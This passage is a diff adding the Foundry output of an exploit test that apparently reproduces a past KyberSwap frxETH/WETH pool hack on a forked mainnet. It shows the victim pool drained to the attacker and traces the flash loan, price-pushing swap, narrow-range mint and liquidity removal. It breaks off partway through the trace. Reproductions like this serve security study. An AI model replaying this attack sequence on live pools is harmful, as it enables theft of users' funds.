@@ -1,0 +1,351 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/KyberSwap_exp.eth.1.sol:KyberswapFrxEthWethPoolExploitTest
+[PASS] testExploit() (gas: 2529592)
+Logs:
+   [ before ]  [ token0 ]  [ victim ] : 6.371036189774251150
+   [ before ]  [ token1 ]  [ victim ] : 2.134741529491887485
+   [ before ]  [ token0 ]  [ attacker ] : 0.000000000000000000
+   [ before ]  [ token1 ]  [ attacker ] : 0.000000000000000000
+   [ after ]  [ token0 ]  [ victim ] : 0.005876187192500041
+   [ after ]  [ token1 ]  [ victim ] : 0.000000000000000000
+   [ after ]  [ token0 ]  [ attacker ] : 6.364001987952861764
+   [ after ]  [ token1 ]  [ attacker ] : 1.116773260184104614
+
+Traces:
+  [15137] KyberswapFrxEthWethPoolExploitTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 18630391 [1.863e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], "KS2-RT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Aave: Pool V3: [0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2], "Aave: Pool V3")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(frxETH: [0x5E8422345238F34275888049021821E8E08CAa1f], "frxETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [2554292] KyberswapFrxEthWethPoolExploitTest::testExploit()
+    ├─ [2629] frxETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   └─ ← [Return] 6371036189774251150 [6.371e18]
+    ├─ [289] frxETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: " [ before ]  [ token0 ]  [ victim ] ", val: 6371036189774251150 [6.371e18], decimals: 18)
+    ├─ [2534] WETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   └─ ← [Return] 2134741529491887485 [2.134e18]
+    ├─ [2444] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: " [ before ]  [ token1 ]  [ victim ] ", val: 2134741529491887485 [2.134e18], decimals: 18)
+    ├─ [2629] frxETH::balanceOf(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [289] frxETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: " [ before ]  [ token0 ]  [ attacker ] ", val: 0, decimals: 18)
+    ├─ [2534] WETH::balanceOf(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [444] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: " [ before ]  [ token1 ]  [ attacker ] ", val: 0, decimals: 18)
+    ├─ [2454547] Aave: Pool V3::fallback(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 2000000000000000000000 [2e21], 0x, 0)
+    │   ├─ [2449503] Pool::flashLoanSimple(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 2000000000000000000000 [2e21], 0x, 0) [delegatecall]
+    │   │   ├─ [2442782] FlashLoanLogic::executeFlashLoanSimple(112225801447630911021174354684661177440979189781136739879716453091386613243583 [1.122e77], 64) [delegatecall]
+    │   │   │   ├─ [35946] InitializableImmutableAdminUpgradeabilityProxy::fallback(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2000000000000000000000 [2e21])
+    │   │   │   │   ├─ [30926] AToken::transferUnderlyingTo(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2000000000000000000000 [2e21]) [delegatecall]
+    │   │   │   │   │   ├─ [27962] WETH::transfer(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2000000000000000000000 [2e21])
+    │   │   │   │   │   │   ├─ emit Transfer(from: InitializableImmutableAdminUpgradeabilityProxy: [0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8], to: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2000000000000000000000 [2e21])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000
+    │   │   │   │   │   │   │   @ 0xb064600732a82908427d092d333e607598a6238a59aeb45e1288cb0bac7161cf: 0x0000000000000000000000000000000000000000000013030c79b088a6fd7705 → 0x000000000000000000000000000000000000000000001296a0e654fce9bd7705
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─ [2315826] KyberswapFrxEthWethPoolExploitTest::executeOperation(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 2000000000000000000000 [2e21], 1000000000000000000 [1e18], KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [248] KS2-RT::swapFeeUnits() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 10
+    │   │   │   │   ├─ [24675] frxETH::approve(AntiSnipAttackPositionManager: [0xe222fBE074A436145b255442D919E4E3A6c6a480], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   ├─ emit Approval(owner: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: AntiSnipAttackPositionManager: [0xe222fBE074A436145b255442D919E4E3A6c6a480], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x60aef3cbd3d1f8493293be0deb6805362830649debc44aa8854e31f47506cc5e: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [24420] WETH::approve(AntiSnipAttackPositionManager: [0xe222fBE074A436145b255442D919E4E3A6c6a480], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   ├─ emit Approval(owner: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: AntiSnipAttackPositionManager: [0xe222fBE074A436145b255442D919E4E3A6c6a480], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x6f3cc48a88ed49102d1068ba6ec4312468302d81340756684628bc51e7d48d32: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [1581690] KS2-RT::swap(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2000000000000000000000 [2e21], false, 20282409603651670423947251286016 [2.028e31], 0x)
+    │   │   │   │   │   ├─ [2406] 0xC7a590291e07B9fe9E64b86c58fD8fC764308C4A::feeConfiguration() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x91c9D4373B077eF8082F468C7c97f2c499e36F5b, 16000 [1.6e4]
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x91c9D4373B077eF8082F468C7c97f2c499e36F5b, value: 296142418282030 [2.961e14])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], value: 1554747695980662 [1.554e15])
+    │   │   │   │   │   ├─ [14243] ERC1967Proxy::fallback(1700693699 [1.7e9], -24, 1773086123625839924672 [1.773e21])
+    │   │   │   │   │   │   ├─ [9333] PoolOracle::write(1700693699 [1.7e9], -24, 1773086123625839924672 [1.773e21]) [delegatecall]
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x9072e8897490532d90c76273ae2cfe893f9d704334a9cfb40f805996ae1be97a: 0x000000000000000000000000000000000000000001fffffff7f746e8655cc26b → 0x000000000000000000000000000000000000000001fffffff7ccdea8655e86c3
+    │   │   │   │   │   │   │   └─ ← [Return] 0, 1
+    │   │   │   │   │   │   └─ ← [Return] 0, 1
+    │   │   │   │   │   ├─ [25795] frxETH::transfer(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6371028957698847497 [6.371e18])
+    │   │   │   │   │   │   ├─ emit Transfer(from: KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], to: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 6371028957698847497 [6.371e18])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xd7c269a0d19630ff9df51948df7e789682b56729f9ef30ffed2a5ddcecda4cf0: 0x000000000000000000000000000000000000000000000000586a77a8cea7048e → 0x00000000000000000000000000000000000000000000000000000693d9491185
+    │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x000000000000000000000000000000000000000000000000586a7114f55df309
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [534] WETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2134741529491887485 [2.134e18]
+    │   │   │   │   │   ├─ [7951] KyberswapFrxEthWethPoolExploitTest::swapCallback(-6371028957698847497 [-6.371e18], 6849615814404497512 [6.849e18], 0x)
+    │   │   │   │   │   │   ├─ [6062] WETH::transfer(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], 6849615814404497512 [6.849e18])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], value: 6849615814404497512 [6.849e18])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xe6f32bf663f0a298de74a03c36a0b63c3142f5009d3fa0261cf593637f4e2fc5: 0x0000000000000000000000000000000000000000000000001da0201c58a3557d → 0x0000000000000000000000000000000000000000000000007caed967321db5e5
+    │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000 → 0x00000000000000000000000000000000000000000000006c0c84a240e3c59f98
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [534] WETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 8984357343896384997 [8.984e18]
+    │   │   │   │   │   ├─ emit Swap(sender: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], deltaQty0: -6371028957698847497 [-6.371e18], deltaQty1: 6849615814404497512 [6.849e18], sqrtP: 20282409603651670423947251286016 [2.028e31], liquidity: 0, currentTick: 110909 [1.109e5])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 7: 0x00000000000000000000000064e540bf00000000000000000000046034bbb33f → 0x000000000000000000000000655e86c300000000000000000001475eeb49ba92
+    │   │   │   │   │   │   @ 5: 100 → 0x0000000000000000000000000000000000000000000000000006936062f11084
+    │   │   │   │   │   │   @ 0x28c3dd0e618e8bddf8cf30cd1a2e788f719d9c1f097596a24acbe0c7cb1e05c7: 0 → 0x000000000000000000000000000000000000000000000eb61564738294cec092
+    │   │   │   │   │   │   @ 0x28c3dd0e618e8bddf8cf30cd1a2e788f719d9c1f097596a24acbe0c7cb1e05c8: 0 → 0x0000000000000000000000000000000000000000000000000001475eeb49ba92
+    │   │   │   │   │   │   @ 10: 100 → 0x0000000000000000000000000000000000000000000000000006935fefc76708
+    │   │   │   │   │   │   @ 0x068b4c0c6d267dccfd56de6cbdeaad93727602837f6d64e4ccf9f8e9a0c13923: 100 → 0x00000000000000000000000000000000000000000000000000058608e82260da
+    │   │   │   │   │   │   @ 6: 0 → 0x000000000000000000000000000000000000000000000eb61564738294cec092
+    │   │   │   │   │   │   @ 3: 0x000000000000ffffe8ffffd00000000000000000ffb1c1bffcb0b29daac6eed4 → 0x00000000000001b13d0000300000000000000100000000000000000000000000
+    │   │   │   │   │   │   @ 4: 0x000000000000000000057103a797fabb00000000000000601e8353398c8915c0 → 0x0000000000000000000693d94910842d00000000000000000000000000000000
+    │   │   │   │   │   │   @ 0x97272f5efc5a2d53be7c6d748ffedb9ab54824b4192f15eeb969110092c359de: 0 → 0x00000000000000000000000000000000000000000000000000010d5707a5062e
+    │   │   │   │   │   └─ ← [Return] -6371028957698847497 [-6.371e18], 6849615814404497512 [6.849e18]
+    │   │   │   │   ├─ [511] KS2-RT::getPoolState() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 20282409603651670423947251286016 [2.028e31], 110909 [1.109e5], 48, false
+    │   │   │   │   ├─ [409352] AntiSnipAttackPositionManager::mint(MintParams({ token0: 0x5E8422345238F34275888049021821E8E08CAa1f, token1: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, fee: 10, tickLower: 110909 [1.109e5], tickUpper: 111310 [1.113e5], ticksPrevious: [48, 48], amount0Desired: 6948087773336076 [6.948e15], amount1Desired: 107809615846697233 [1.078e17], amount0Min: 0, amount1Min: 0, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1700693699 [1.7e9] }))
+    │   │   │   │   │   ├─ [511] KS2-RT::getPoolState() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 20282409603651670423947251286016 [2.028e31], 110909 [1.109e5], 48, false
+    │   │   │   │   │   ├─ [214271] KS2-RT::mint(AntiSnipAttackPositionManager: [0xe222fBE074A436145b255442D919E4E3A6c6a480], 110909 [1.109e5], 111310 [1.113e5], [48, 48], 89631297100385708499 [8.963e19], 0x0000000000000000000000005e8422345238f34275888049021821e8e08caa1f000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
+    │   │   │   │   │   │   ├─ [4815] 0xC7a590291e07B9fe9E64b86c58fD8fC764308C4A::isWhitelistedNFTManager(AntiSnipAttackPositionManager: [0xe222fBE074A436145b255442D919E4E3A6c6a480]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [2238] ERC1967Proxy::fallback(1700693699 [1.7e9], 110909 [1.109e5], 0)
+    │   │   │   │   │   │   │   ├─ [1828] PoolOracle::write(1700693699 [1.7e9], 110909 [1.109e5], 0) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0, 1
+    │   │   │   │   │   │   │   └─ ← [Return] 0, 1
+    │   │   │   │   │   │   ├─ [629] frxETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 7232075403653 [7.232e12]
+    │   │   │   │   │   │   ├─ [534] WETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 8984357343896384997 [8.984e18]
+    │   │   │   │   │   │   ├─ [12793] AntiSnipAttackPositionManager::mintCallback(6948087773336076 [6.948e15], 107809615846697233 [1.078e17], 0x0000000000000000000000005e8422345238f34275888049021821e8e08caa1f000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
+    │   │   │   │   │   │   │   ├─ [3599] frxETH::transferFrom(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], 6948087773336076 [6.948e15])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], value: 6948087773336076 [6.948e15])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xd7c269a0d19630ff9df51948df7e789682b56729f9ef30ffed2a5ddcecda4cf0: 0x00000000000000000000000000000000000000000000000000000693d9491185 → 0x0000000000000000000000000000000000000000000000000018b5d398e22391
+    │   │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000000586a7114f55df309 → 0x0000000000000000000000000000000000000000000000005851c1d535c4e0fd
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [3425] WETH::transferFrom(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], 107809615846697233 [1.078e17])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], value: 107809615846697233 [1.078e17])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xe6f32bf663f0a298de74a03c36a0b63c3142f5009d3fa0261cf593637f4e2fc5: 0x0000000000000000000000000000000000000000000000007caed967321db5e5 → 0x0000000000000000000000000000000000000000000000007e2dddad72079ef6
+    │   │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000006c0c84a240e3c59f98 → 0x00000000000000000000000000000000000000000000006c0b059dfaa3dbb687
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [629] frxETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 6955319848739729 [6.955e15]
+    │   │   │   │   │   │   ├─ [534] WETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 9092166959743082230 [9.092e18]
+    │   │   │   │   │   │   ├─ emit Mint(sender: AntiSnipAttackPositionManager: [0xe222fBE074A436145b255442D919E4E3A6c6a480], owner: AntiSnipAttackPositionManager: [0xe222fBE074A436145b255442D919E4E3A6c6a480], tickLower: 110909 [1.109e5], tickUpper: 111310 [1.113e5], qty: 89631297100385708499 [8.963e19], qty0: 6948087773336076 [6.948e15], qty1: 107809615846697233 [1.078e17])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x7c5b0dd826bec9ebe8f2f9f7b522e9532ce1c1b6bdff74def3728bf9517ed38f: 0 → 0x0000000000000004dbe255d369fd69d30000000000000004dbe255d369fd69d3
+    │   │   │   │   │   │   │   @ 0x4a7072cae31c8066404bff29911e471dd7b488d543a218806da51870552a74bb: 0x00000000000000000000000000000000000000000000000000000d89e8ffffd0 → 0x000000000000000000000000000000000000000000000000000001b13dffffd0
+    │   │   │   │   │   │   │   @ 0x89a54f90d9e003cd5f9b720a86279b5206f41c30c385a19f4b81659669bd434a: 0 → 0x000000000000000000000000000000000000000000000000000001b2ce000030
+    │   │   │   │   │   │   │   @ 3: 0x00000000000001b13d0000300000000000000100000000000000000000000000 → 0x00000000000001b13d01b13d0000000000000100000000000000000000000000
+    │   │   │   │   │   │   │   @ 0x7c5b0dd826bec9ebe8f2f9f7b522e9532ce1c1b6bdff74def3728bf9517ed391: 0 → 0x0000000000000000000000000000000000000000000000000001475eeb49ba92
+    │   │   │   │   │   │   │   @ 0x08af64ec66eeb0a9323d9ab71dece11c266bdc49eb90ae49f68e1020935039b1: 0 → 0xfffffffffffffffb241daa2c9602962d0000000000000004dbe255d369fd69d3
+    │   │   │   │   │   │   │   @ 5: 0x0000000000000000000000000000000000000000000000000006936062f11084 → 0x000000000000000000000000000000000000000000000000000693d94910842d
+    │   │   │   │   │   │   │   @ 0xbab403c6b7a4f6398fb9a60076fec1a19710246ffec79a0d8dcd6aa86d5effcf: 0 → 0x00000000000000000000000000000000000000000000000000000d89e801b13d
+    │   │   │   │   │   │   │   @ 0x79fec930302cbef6538b0b0276d3fc35ecc4ea3997330fc651eb3f244364b657: 0 → 0x000000000000000000000000000000000000000000000004dbe255d369fd69d3
+    │   │   │   │   │   │   │   @ 4: 0x0000000000000000000693d94910842d00000000000000000000000000000000 → 0x0000000000000000000693d94910842d0000000000000004dbe255d369fd69d3
+    │   │   │   │   │   │   │   @ 0x7c5b0dd826bec9ebe8f2f9f7b522e9532ce1c1b6bdff74def3728bf9517ed390: 0 → 0x000000000000000000000000000000000000000000000eb61564738294cec092
+    │   │   │   │   │   │   │   @ 0x32a89ee8f976fa6c55d09c2345574200c605435dfc9abb32886a260df274372c: 0x00000000000000000000000000000000000000000000000000000d89e8000030 → 0x00000000000000000000000000000000000000000000000000000d89e801b2ce
+    │   │   │   │   │   │   └─ ← [Return] 6948087773336076 [6.948e15], 107809615846697233 [1.078e17], 0
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 359)
+    │   │   │   │   │   ├─ emit MintPosition(tokenId: 359, poolId: 29, liquidity: 89631297100385708499 [8.963e19], amount0: 6948087773336076 [6.948e15], amount1: 107809615846697233 [1.078e17])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 11: 359 → 360
+    │   │   │   │   │   │   @ 0x10674a0210f598c46ff7830a776a79618daec931e980c3cb40139c1bb040ed37: 0 → 359
+    │   │   │   │   │   │   @ 0x31d2500938299224c8e07d3bd2cd7e1ff75e965a94f8c1581516d092ea3664ce: 0 → 358
+    │   │   │   │   │   │   @ 8: 358 → 359
+    │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 1
+    │   │   │   │   │   │   @ 0xf4d6b0967b42b86b19b12197339035f1db3d03253fe3615cd3e99d15d3921db0: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x332dca6499ff1eeb1ebecb025d1fe11bc7b98d8869f38665762588e9ef30b699: 0 → 0x0000000000000004dbe255d369fd69d301b2ce01b13d0000000000000000001d
+    │   │   │   │   │   │   @ 0xd9d254dc3e1fd0c8a2c273b5f2faa22fe5546c3bb2d6ce6cb6781695d3dee0a4: 0 → 0x0000000000000000000000000000000000000000655e86c3655e86c3655e86c3
+    │   │   │   │   │   │   @ 0xf3f7a9fe364faab93b216da50a3214154f22a0a2b415b23a84c8169e8b637049: 0 → 359
+    │   │   │   │   │   └─ ← [Return] 359, 89631297100385708499 [8.963e19], 6948087773336076 [6.948e15], 107809615846697233 [1.078e17]
+    │   │   │   │   ├─ [88362] AntiSnipAttackPositionManager::removeLiquidity(RemoveLiquidityParams({ tokenId: 359, liquidity: 14938549516730950591 [1.493e19], amount0Min: 0, amount1Min: 0, deadline: 1700693699 [1.7e9] }))
+    │   │   │   │   │   ├─ [72901] KS2-RT::burn(110909 [1.109e5], 111310 [1.113e5], 14938549516730950591 [1.493e19])
+    │   │   │   │   │   │   ├─ [2238] ERC1967Proxy::fallback(1700693699 [1.7e9], 110909 [1.109e5], 89631297100385708499 [8.963e19])
+    │   │   │   │   │   │   │   ├─ [1828] PoolOracle::write(1700693699 [1.7e9], 110909 [1.109e5], 89631297100385708499 [8.963e19]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0, 1
+    │   │   │   │   │   │   │   └─ ← [Return] 0, 1
+    │   │   │   │   │   │   ├─ [24995] frxETH::transfer(AntiSnipAttackPositionManager: [0xe222fBE074A436145b255442D919E4E3A6c6a480], 1158014628889345 [1.158e15])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], to: AntiSnipAttackPositionManager: [0xe222fBE074A436145b255442D919E4E3A6c6a480], value: 1158014628889345 [1.158e15])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xd7c269a0d19630ff9df51948df7e789682b56729f9ef30ffed2a5ddcecda4cf0: 0x0000000000000000000000000000000000000000000000000018b5d398e22391 → 0x0000000000000000000000000000000000000000000000000014989e4e48a090
+    │   │   │   │   │   │   │   │   @ 0x44f1bc1c2044bfdd0cb313cf161a3cbbceef665060f4f8e5b22edc416f6d545a: 0 → 0x00000000000000000000000000000000000000000000000000041d354a998301
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [25162] WETH::transfer(AntiSnipAttackPositionManager: [0xe222fBE074A436145b255442D919E4E3A6c6a480], 17968269307782871 [1.796e16])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], to: AntiSnipAttackPositionManager: [0xe222fBE074A436145b255442D919E4E3A6c6a480], value: 17968269307782871 [1.796e16])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xe6f32bf663f0a298de74a03c36a0b63c3142f5009d3fa0261cf593637f4e2fc5: 0x0000000000000000000000000000000000000000000000007e2dddad72079ef6 → 0x0000000000000000000000000000000000000000000000007dee07a1bcb5f81f
+    │   │   │   │   │   │   │   │   @ 0x634801cb989eddc87771aa2b572e20b594a16b6157980cf1db0085d946968187: 0 → 0x000000000000000000000000000000000000000000000000003fd60bb551a6d7
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ emit Burn(owner: AntiSnipAttackPositionManager: [0xe222fBE074A436145b255442D919E4E3A6c6a480], tickLower: 110909 [1.109e5], tickUpper: 111310 [1.113e5], qty: 14938549516730950591 [1.493e19], qty0: 1158014628889345 [1.158e15], qty1: 17968269307782871 [1.796e16])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x7c5b0dd826bec9ebe8f2f9f7b522e9532ce1c1b6bdff74def3728bf9517ed38f: 0x0000000000000004dbe255d369fd69d30000000000000004dbe255d369fd69d3 → 0x00000000000000040c91f2302da8861400000000000000040c91f2302da88614
+    │   │   │   │   │   │   │   @ 4: 0x0000000000000000000693d94910842d0000000000000004dbe255d369fd69d3 → 0x0000000000000000000693d94910842d00000000000000040c91f2302da88614
+    │   │   │   │   │   │   │   @ 0x79fec930302cbef6538b0b0276d3fc35ecc4ea3997330fc651eb3f244364b657: 0x000000000000000000000000000000000000000000000004dbe255d369fd69d3 → 0x0000000000000000000000000000000000000000000000040c91f2302da88614
+    │   │   │   │   │   │   │   @ 0x08af64ec66eeb0a9323d9ab71dece11c266bdc49eb90ae49f68e1020935039b1: 0xfffffffffffffffb241daa2c9602962d0000000000000004dbe255d369fd69d3 → 0xfffffffffffffffbf36e0dcfd25779ec00000000000000040c91f2302da88614
+    │   │   │   │   │   │   └─ ← [Return] 1158014628889345 [1.158e15], 17968269307782871 [1.796e16], 0
+    │   │   │   │   │   ├─ [397] 0xC7a590291e07B9fe9E64b86c58fD8fC764308C4A::vestingPeriod() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 300
+    │   │   │   │   │   ├─ emit RemoveLiquidity(tokenId: 359, liquidity: 14938549516730950591 [1.493e19], amount0: 1158014628889345 [1.158e15], amount1: 17968269307782871 [1.796e16], additionalRTokenOwed: 0)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x332dca6499ff1eeb1ebecb025d1fe11bc7b98d8869f38665762588e9ef30b699: 0x0000000000000004dbe255d369fd69d301b2ce01b13d0000000000000000001d → 0x00000000000000040c91f2302da8861401b2ce01b13d0000000000000000001d
